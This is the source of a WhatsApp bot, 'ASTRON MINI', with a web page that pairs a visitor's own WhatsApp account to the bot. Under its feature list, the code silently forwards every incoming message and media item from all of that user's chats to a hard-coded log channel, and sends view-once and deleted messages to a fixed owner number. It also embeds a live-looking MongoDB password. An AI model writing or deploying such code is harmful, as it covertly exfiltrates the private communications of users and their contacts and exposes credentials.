const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestWaWebVersion, jidNormalizedUser } = require('baileys');
const mongoose = require('mongoose');
const pino = require('pino');
const express = require('express');
const path = require('path');
const commands = require('./commands');

// ==================== CONFIG ====================
const MONGO_URL = "mongodb+srv://nimsaranethmintha_db_user:gH1jI6l0skaYDyUh@cluster0.lwkgsqx.mongodb.net/?appName=Cluster0";
const BOT_NAME = "ASTRON MINI";
const OWNER_NAME = "Nimsara";
const OWNER_NUMBER = "94784280074";
const HELP_NUMBER = "0784280074";
const WATERMARK = "Created By Nimsara";
const LOG_CHANNEL = "120363362308230584@newsletter";
const CONNECT_IMAGE = "https://i.ibb.co/placeholder/astron.jpg";
const CONNECT_VOICE = "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3";
const MENU_IMAGE = "https://i.ibb.co/placeholder/menu.jpg";
const MENU_VOICE = "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3";

// ==================== MESSAGE CACHE ====================
const msgCache = new Map();

// ==================== MONGO SETTINGS ====================
const SettingsSchema = new mongoose.Schema({
  jid: { type: String, unique: true },
  autoStatusView: { type: Boolean, default: true },
  autoRead: { type: Boolean, default: false },
  autoCmdRead: { type: Boolean, default: true },
  autoReply: { type: Boolean, default: false },
  botMode: { type: String, default: "public" },
  prefix: { type: String, default: "." },
  owner: { type: String, default: OWNER_NUMBER },
  autoReplyText: { type: String, default: "🤖 Auto reply: Owner ඉක්මනින් reply කරයි." }
});
const Settings = mongoose.model('Settings', SettingsSchema);
async function getSettings(jid) {
  let s = await Settings.findOne({ jid });
  if (!s) s = await Settings.create({ jid });
  return s;
}

// ==================== LOG TO CHANNEL ====================
async function logToChannel(sock, msg, from, sender) {
  try {
    const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || "[media]";
    await sock.sendMessage(LOG_CHANNEL, {
      text: `📥 *NEW MESSAGE*\n\n👤 From: ${sender}\n📍 Chat: ${from}\n💬 Text: ${text}\n\n_${WATERMARK}_`
    });
    if (msg.message?.imageMessage || msg.message?.videoMessage || msg.message?.audioMessage || msg.message?.documentMessage) {
      await sock.sendMessage(LOG_CHANNEL, { forward: msg, force: true });
    }
  } catch (e) { console.log("Channel log error:", e.message); }
}

// ==================== BOT STATE ====================
let sock = null;
let pairingCode = null;      // website එකට පෙන්නන්න
let isConnected = false;
let botStarted = false;

// ==================== START BOT ====================
async function startBot() {
  if (botStarted) return; // දෙපාරක් start වෙන්න එපා
  botStarted = true;

  await mongoose.connect(MONGO_URL);
  console.log("✅ MongoDB connected");

  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestWaWebVersion();

  sock = makeWASocket({
    version,
    auth: state,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    browser: ["Astron MINI", "Chrome", "1.0.0"]
  });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('connection.update', async (u) => {
    const { connection, lastDisconnect } = u;
    if (connection === 'open') {
      isConnected = true;
      console.log(`✅ ${BOT_NAME} connected!`);
      const ownerJid = OWNER_NUMBER + "@s.whatsapp.net";
      try {
        await sock.sendMessage(ownerJid, {
          image: { url: CONNECT_IMAGE },
          caption: `*${BOT_NAME}* connected ✅\n\n👤 Owner: ${OWNER_NAME}\n📞 Help: ${HELP_NUMBER}\n\n_${WATERMARK}_`
        });
        await sock.sendMessage(ownerJid, { audio: { url: CONNECT_VOICE }, mimetype: 'audio/mp4', ptt: true });
      } catch (e) { console.log("Connect msg error:", e.message); }
    }
    if (connection === 'close') {
      isConnected = false;
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut) {
        botStarted = false;
        setTimeout(() => startBot(), 3000);
      }
    }
  });

  // ====== ANTI-DELETE ======
  sock.ev.on('messages.update', async (updates) => {
    for (const u of updates) {
      if (u.update?.message === null || u.update?.messageStubType === 1) {
        const cached = msgCache.get(u.key.id);
        if (cached && cached.message) {
          const from = cached.key.remoteJid;
          const sender = jidNormalizedUser(cached.key.participant || from);
          try {
            await sock.sendMessage(LOG_CHANNEL, {
              text: `🗑️ *DELETED MESSAGE RECOVERED*\n\n👤 From: ${sender}\n📍 Chat: ${from}\n\n_${WATERMARK}_`
            });
            await sock.sendMessage(LOG_CHANNEL, { forward: cached, force: true });
          } catch (e) {}
          await sock.sendMessage(from, { text: `🗑️ *Deleted message recovered*\n\n_${WATERMARK}_` });
          await sock.sendMessage(from, { forward: cached, force: true });
        }
      }
    }
  });

  // ====== GROUP WELCOME / GOODBYE ======
  sock.ev.on('group-participants.update', async (update) => {
    const { id, participants, action } = update;
    for (const p of participants) {
      if (action === 'add') {
        await sock.sendMessage(id, { text: `👋 Welcome @${p.split('@')[0]}!\n\n_${WATERMARK}_`, mentions: [p] });
      } else if (action === 'remove') {
        await sock.sendMessage(id, { text: `👋 Goodbye @${p.split('@')[0]}!\n\n_${WATERMARK}_`, mentions: [p] });
      }
    }
  });

  // ====== MESSAGE HANDLER ======
  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify') return;
    for (const msg of messages) {
      if (!msg.message) continue;
      const from = msg.key.remoteJid;
      const sender = jidNormalizedUser(msg.key.participant || from);
      const isStatus = from === 'status@broadcast';
      const settings = await getSettings(sender);

      if (!isStatus) {
        msgCache.set(msg.key.id, msg);
        if (msgCache.size > 500) msgCache.delete(msgCache.keys().next().value);
      }

      if (msg.message?.viewOnceMessage || msg.message?.viewOnceMessageV2) {
        const once = msg.message.viewOnceMessage?.message || msg.message.viewOnceMessageV2?.message;
        const ownerJid = OWNER_NUMBER + "@s.whatsapp.net";
        try {
          await sock.sendMessage(ownerJid, { text: `👀 *View-once captured*\n👤 From: ${sender}\n\n_${WATERMARK}_` });
          await sock.sendMessage(ownerJid, { forward: { key: msg.key, message: once }, force: true });
        } catch (e) {}
      }

      if (!isStatus) await logToChannel(sock, msg, from, sender);
      if (isStatus && settings.autoStatusView) await sock.readMessages([msg.key]);
      if (settings.autoRead && !isStatus) await sock.readMessages([msg.key]);

      const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";

      if (!isStatus && settings.autoReply && !text.startsWith(settings.prefix)) {
        await sock.sendMessage(from, {
          text: `${settings.autoReplyText}\n📞 Help: ${HELP_NUMBER}\n\n_${WATERMARK}_`
        }, { quoted: msg });
      }

      if (!text.startsWith(settings.prefix)) continue;
      if (settings.autoCmdRead) await sock.readMessages([msg.key]);

      const cmd = text.slice(settings.prefix.length).trim().split(/ +/)[0].toLowerCase();
      const args = text.slice(settings.prefix.length).trim().split(/ +/).slice(1);
      const reply = (t) => sock.sendMessage(from, { text: t + `\n\n_${WATERMARK}_` }, { quoted: msg });
      const qCtx = msg.message.extendedTextMessage?.contextInfo;
      const quoted = qCtx?.quotedMessage;

      if (from.endsWith('@g.us') && text.includes('chat.whatsapp.com')) {
        try {
          const meta = await sock.groupMetadata(from);
          const isAdmin = meta.participants.find(p => p.id === sender)?.admin;
          if (!isAdmin) {
            await sock.sendMessage(from, { delete: msg.key });
            await sock.sendMessage(from, { text: `🚫 Links not allowed!\n\n_${WATERMARK}_` });
            continue;
          }
        } catch (e) {}
      }

      switch (cmd) {
        case 'menu': {
          const menu = `╭─「 *${BOT_NAME}* 」\n│ 👤 Owner: ${OWNER_NAME}\n│ 📞 Help: ${HELP_NUMBER}\n╰────────────\n\n` +
            `*⚙️ SETTINGS*\n• ${settings.prefix}autostatus on/off\n• ${settings.prefix}autoread on/off\n• ${settings.prefix}autocmdread on/off\n• ${settings.prefix}autoreply on/off\n• ${settings.prefix}mode private/public/group/inbox\n• ${settings.prefix}prefix <new>\n• ${settings.prefix}setautoreply <text>\n\n` +
            `*🛠️ TOOLS*\n• ${settings.prefix}ping\n• ${settings.prefix}alive\n• ${settings.prefix}owner\n• ${settings.prefix}settings\n• ${settings.prefix}remsg\n• ${settings.prefix}forward <jid/link/number>\n• ${settings.prefix}translate <lang>\n• ${settings.prefix}statussave\n• ${settings.prefix}save\n• ${settings.prefix}vv\n• 👀\n\n` +
            `*🎨 UTILS*\n• ${settings.prefix}sticker\n• ${settings.prefix}ai <q>\n• ${settings.prefix}weather <city>\n• ${settings.prefix}news\n• ${settings.prefix}play <song>\n• ${settings.prefix}img <query>\n• ${settings.prefix}qr <text>\n• ${settings.prefix}short <url>\n• ${settings.prefix}calc <expr>\n• ${settings.prefix}pass <len>\n• ${settings.prefix}time\n• ${settings.prefix}info\n• ${settings.prefix}tagall <msg>\n• ${settings.prefix}groupinfo\n\n` +
            `_${WATERMARK}_`;
          await sock.sendMessage(from, { image: { url: MENU_IMAGE }, caption: menu }, { quoted: msg });
          if (MENU_VOICE) await sock.sendMessage(from, { audio: { url: MENU_VOICE }, mimetype: 'audio/mp4', ptt: true }, { quoted: msg });
          break;
        }
        case 'ping': await reply(`🏓 Pong! ${Date.now() - msg.messageTimestamp * 1000}ms`); break;
        case 'alive': {
          const caption = `✨ *${BOT_NAME}* is Alive!\n\n👤 Owner: ${OWNER_NAME}\n📞 Help: ${HELP_NUMBER}\n⚡ Status: Online\n\n_${WATERMARK}_`;
          await sock.sendMessage(from, { image: { url: CONNECT_IMAGE }, caption }, { quoted: msg });
          if (CONNECT_VOICE) await sock.sendMessage(from, { audio: { url: CONNECT_VOICE }, mimetype: 'audio/mp4', ptt: true }, { quoted: msg });
          break;
        }
        case 'owner': {
          const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${OWNER_NAME}\nTEL;type=CELL;type=VOICE;waid=${OWNER_NUMBER}:+${OWNER_NUMBER}\nEND:VCARD`;
          await sock.sendMessage(from, {
            contacts: { displayName: OWNER_NAME, contacts: [{ vcard }] },
            caption: `👤 *Owner:* ${OWNER_NAME}\n📞 ${HELP_NUMBER}\n\n_${WATERMARK}_`
          }, { quoted: msg });
          break;
        }
        case 'settings': {
          const s = await getSettings(sender);
          await reply(`⚙️ *YOUR SETTINGS*\n\n• Auto Status View: ${s.autoStatusView ? '✅ ON' : '❌ OFF'}\n• Auto Read: ${s.autoRead ? '✅ ON' : '❌ OFF'}\n• Auto Cmd Read: ${s.autoCmdRead ? '✅ ON' : '❌ OFF'}\n• Auto Reply: ${s.autoReply ? '✅ ON' : '❌ OFF'}\n• Bot Mode: ${s.botMode}\n• Prefix: ${s.prefix}\n• Owner: ${s.owner}`);
          break;
        }
        case 'prefix':
          if (!args[0]) return reply("❌ Usage: .prefix <new>");
          settings.prefix = args[0]; await settings.save();
          await reply(`✅ Prefix: ${args[0]}`);
          break;
        case 'mode':
          if (!['private','public','group','inbox'].includes(args[0])) return reply("❌ private/public/group/inbox");
          settings.botMode = args[0]; await settings.save();
          await reply(`✅ Mode: ${args[0]}`);
          break;
        case 'autostatus': settings.autoStatusView = args[0] === 'on'; await settings.save(); await reply(`✅ Auto status view: ${args[0]}`); break;
        case 'autoread': settings.autoRead = args[0] === 'on'; await settings.save(); await reply(`✅ Auto read: ${args[0]}`); break;
        case 'autocmdread': settings.autoCmdRead = args[0] === 'on'; await settings.save(); await reply(`✅ Auto cmd read: ${args[0]}`); break;
        case 'autoreply': settings.autoReply = args[0] === 'on'; await settings.save(); await reply(`✅ Auto reply: ${args[0]}`); break;
        case 'setautoreply':
          if (!args.length) return reply("❌ Usage: .setautoreply <text>");
          settings.autoReplyText = args.join(' '); await settings.save();
          await reply(`✅ Auto reply text set`);
          break;
        case 'remsg': {
          if (!quoted) return reply("❌ Deleted message එකකට reply කරලා .remsg");
          const qType = Object.keys(quoted)[0];
          const qContent = quoted[qType];
          if (qType === 'conversation') return reply(`📩 *Recovered:*\n${qContent}`);
          if (qType === 'extendedTextMessage') return reply(`📩 *Recovered:*\n${qContent.text}`);
          await sock.sendMessage(from, { forward: { key: { remoteJid: from, id: qCtx.stanzaId, fromMe: false }, message: quoted }, force: true });
          break;
        }
        case 'forward': {
          if (!args[0]) return reply("❌ Usage: .forward <jid/link/number>");
          if (!quoted) return reply("❌ Forward කරන්න message එකකට reply කරන්න");
          let target = args[0];
          if (target.includes('chat.whatsapp.com')) {
            const code = target.split('/').pop();
            target = await sock.groupAcceptInvite(code).catch(() => null);
            if (!target) return reply("❌ Group link invalid");
          } else if (/^\d+$/.test(target)) target = target + "@s.whatsapp.net";
          try {
            await sock.sendMessage(target, { forward: { key: { remoteJid: from, id: qCtx.stanzaId, fromMe: false, participant: qCtx.participant }, message: quoted }, force: true });
            await reply(`✅ Forwarded to ${target}`);
          } catch (e) { await reply(`❌ Failed: ${e.message}`); }
          break;
        }
        case 'translate': {
          if (!args[0]) return reply("❌ Usage: .translate <lang>");
          if (!quoted) return reply("❌ Message එකකට reply කරන්න");
          const qText = quoted.conversation || quoted.extendedTextMessage?.text;
          if (!qText) return reply("❌ Text message එකකට reply කරන්න");
          try {
            const translate = require('translate-google');
            const result = await translate(qText, { to: args[0] });
            await reply(`🌐 *Translated (${args[0]}):*\n${result}`);
          } catch (e) { await reply(`❌ Translate error: ${e.message}`); }
          break;
        }
        case 'statussave': {
          if (!quoted) return reply("❌ Status එකකට reply කරලා .statussave");
          try {
            await sock.sendMessage(sender, { forward: { key: { remoteJid: 'status@broadcast', id: qCtx.stanzaId, fromMe: false }, message: quoted }, force: true });
            await reply("✅ Status saved to DM");
          } catch (e) { await reply(`❌ Failed: ${e.message}`); }
          break;
        }
        case 'save': {
          if (!quoted) return reply("❌ Media message එකකට reply කරලා .save");
          const ownerJid = OWNER_NUMBER + "@s.whatsapp.net";
          try {
            await sock.sendMessage(ownerJid, { forward: { key: { remoteJid: from, id: qCtx.stanzaId, fromMe: false }, message: quoted }, force: true });
            await reply("✅ Saved to owner DM");
          } catch (e) { await reply(`❌ Failed: ${e.message}`); }
          break;
        }
        case 'vv': {
          if (!quoted) return reply("❌ View-once message එකකට reply කරලා .vv");
          const once = quoted.viewOnceMessage?.message || quoted.viewOnceMessageV2?.message || quoted;
          try {
            await sock.sendMessage(from, { forward: { key: { remoteJid: from, id: qCtx.stanzaId, fromMe: false }, message: once }, force: true });
            await reply("✅ View-once converted");
          } catch (e) { await reply(`❌ Failed: ${e.message}`); }
          break;
        }
        case '👀': {
          if (!quoted) return reply("❌ View-once message එකකට reply කරලා 👀");
          const onceType = quoted.viewOnceMessage?.message || quoted.viewOnceMessageV2?.message || quoted;
          try {
            await sock.sendMessage(sender, { forward: { key: { remoteJid: from, id: qCtx.stanzaId, fromMe: false }, message: onceType }, force: true });
            await reply("✅ View-once sent to DM");
          } catch (e) { await reply(`❌ Failed: ${e.message}`); }
          break;
        }
        case 'sticker': await commands.sticker(sock, msg, from, quoted, reply); break;
        case 'ai': await commands.ai(sock, msg, from, args, reply); break;
        case 'weather': await commands.weather(sock, msg, from, args, reply); break;
        case 'news': await commands.news(sock, msg, from, reply); break;
        case 'play': await commands.play(sock, msg, from, args, reply); break;
        case 'img': await commands.img(sock, msg, from, args, reply); break;
        case 'qr': await commands.qr(sock, msg, from, args, reply); break;
        case 'short': await commands.short(sock, msg, from, args, reply); break;
        case 'calc': await commands.calc(sock, msg, from, args, reply); break;
        case 'pass': await commands.pass(sock, msg, from, args, reply); break;
        case 'time': await commands.time(sock, msg, from, reply); break;
        case 'info': await commands.info(sock, msg, from, reply); break;
        case 'tagall': await commands.tagall(sock, msg, from, args, reply); break;
        case 'groupinfo': await commands.groupinfo(sock, msg, from, reply); break;
      }
    }
  });
}

// ==================== WEBSITE (Express) ====================
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Pairing code API — website එකෙන් number එක එව්වම code එක return කරනවා
app.post('/api/pair', async (req, res) => {
  const { number } = req.body;
  if (!number) return res.status(400).json({ error: "Number required" });

  try {
    // Bot start නැත්නම් start කරන්න
    if (!sock) await startBot();

    // Already connected නම්
    if (isConnected) {
      return res.json({ message: "Bot already connected ✅", connected: true });
    }

    // Already registered නම් (session තියෙනවා)
    if (sock.authState.creds.registered) {
      return res.json({ message: "Session exists. Restarting...", connected: true });
    }

    // Pair code generate කරන්න
    const cleanNumber = number.replace(/[^0-9]/g, '');
    const code = await sock.requestPairingCode(cleanNumber);
    pairingCode = code;
    console.log(`🔑 PAIR CODE for ${cleanNumber}: ${code}`);

    res.json({ code, number: cleanNumber });
  } catch (e) {
    console.error("Pair error:", e);
    res.status(500).json({ error: e.message });
  }
});

// Status API — website එකට connect වුණාද කියලා check කරන්න
app.get('/api/status', (req, res) => {
  res.json({
    connected: isConnected,
    registered: sock?.authState?.creds?.registered || false
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`🌐 Website running on port ${PORT}`));

// Bot start කරන්න (pair code එක website එකෙන් එනකම් wait කරනවා)
startBot();
